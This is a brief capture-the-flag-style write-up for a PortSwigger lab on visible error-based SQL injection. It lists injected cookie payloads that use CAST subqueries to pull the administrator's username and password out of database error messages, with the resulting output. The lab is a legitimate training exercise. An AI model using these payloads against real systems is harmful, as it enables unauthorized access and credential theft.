# Lab: Visible error-based SQL injection
# https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

```bash
Cookie: TrackingId=ClSHU6wJ9ZEjamJH'
```
```bash
Cookie: TrackingId=ClSHU6wJ9ZEjamJH'and 1=CAST((SELECT 1) AS int)--;
```
```bash
Cookie: TrackingId=ClSHU6wJ9ZEjamJH'and 1=CAST((SELECT username from users) AS int)--;

# Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'ClSHU6wJ9ZEjamJH'and 1=CAST((SELECT username from users) AS '. Expected  char
```
```bash
#there is a character limit.
Cookie: TrackingId='and 1=CAST((SELECT username from users) AS int)--;

# ERROR: more than one row returned by a subquery used as an expression
```
```bash
Cookie: TrackingId='and 1=CAST((SELECT username from users LIMIT 1) AS int)--;

ERROR: invalid input syntax for type integer: "administrator"
```
```bash
Cookie: TrackingId='and 1=CAST((SELECT password from users LIMIT 1) AS int)--;

ERROR: invalid input syntax for type integer: "hyhb5ythcz2ypmhwxdjo"  
```
